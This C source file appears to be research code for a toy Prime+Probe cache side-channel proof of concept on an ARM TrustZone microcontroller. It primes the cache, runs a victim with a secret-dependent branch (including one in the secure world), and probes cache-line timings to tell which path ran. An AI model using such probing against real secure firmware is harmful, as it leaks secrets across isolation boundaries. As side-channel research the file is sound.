#include "toy_cache.h"

#define N_CLS 256
#define MATRIX_CL_PER_LINE 16
#define CACHE_MISS_THRESHOLD 21

//------------------------------------------------------------------------------
// PRIME+PROBE Attack
//------------------------------------------------------------------------------
void trace_victim_matrix(void (*victim)(void)){
    prime();
    victim();
    for (int cl = 0; cl < N_CLS; cl++){
        if(probe_line(cl, 0) > CACHE_MISS_THRESHOLD) {
            printf("%03d| ", cl);
        } else
            printf("---| ");
        if(cl%MATRIX_CL_PER_LINE==(MATRIX_CL_PER_LINE-1))
            printf("\r\n");
    }
}

void trace_victim(void (*victim)(void)){
    prime();
    victim();
    for (int cl = 0; cl < N_CLS; cl++){
        printf("%d ", (probe_line(cl, 0) > CACHE_MISS_THRESHOLD) ? 2 : 1);
    }
}

//------------------------------------------------------------------------------
// Victims - Cacheble 
//------------------------------------------------------------------------------
int secret = 20;
int store_secret = 0;
int dummy_secret = 0;
__attribute__((section(".cacheable_text")))
int process_secret(int secret){
    store_secret = secret;
}

__attribute__((section(".cacheable_text")))
int dummy_operation(int secret){
    dummy_secret = secret;
}

__attribute__((aligned(16)))
__attribute__((section(".cacheable_text")))
void victim(){
    int i = 0;
	int var = 0;
    if(secret==1)
        process_secret(secret);
    else
        dummy_operation(secret);
} 

//------------------------------------------------------------------------------
// Trace If-then-Else Paths 
//------------------------------------------------------------------------------
void if_path(){
    secret = 0;
    victim();
}

void else_path(){
    secret = 1;
    victim();
}

//------------------------------------------------------------------------------
// Make all NS Non-Cacheable
//------------------------------------------------------------------------------
extern uint32_t __cacheable_text_start__;
extern uint32_t __cacheable_text_end__;
void setup_ns_mpu(void) {
    uint32_t base_cacheable  = (uint32_t)&__cacheable_text_start__;

    ARM_MPU_Disable();

    // REGION 0: Mark entire NS memory as Strongly Ordered Non-cacheable
    ARM_MPU_SetMemAttr(0UL, ARM_MPU_ATTR_DEVICE_nGnRnE);

    MPU->RNR  = 0UL;
    MPU->RBAR = 0x8041400;
    MPU->RLAR = (base_cacheable - 1) | (0UL << MPU_RLAR_AttrIndx_Pos) | MPU_RLAR_EN_Msk;

    ARM_MPU_Enable(MPU_CTRL_PRIVDEFENA_Msk); // No default memory map
}

//------------------------------------------------------------------------------
// PoC Toy Cache Attack
//------------------------------------------------------------------------------
void cache_toy_attack_ns(){
    setup_ns_mpu();
    printf("TRACE IF\r\n");    
    trace_victim(if_path);
    printf("\r\n");
    printf("TRACE ELSE\r\n");    
    trace_victim(else_path);
}

void wrap_victim_s_world(){
    // Invoke the victim in the S world. We need this wrap because the trace
    // in waiting for a function pointer void (*victim)(void) and the NS entry 
    // point is not.
    victim_s_world();
}

void cache_toy_attack(){
    setup_ns_mpu();
    printf("TRACE IF\r\n");    
    trace_victim(wrap_victim_s_world);
    printf("\r\n");
    printf("TRACE ELSE\r\n");    
    trace_victim(wrap_victim_s_world);
}
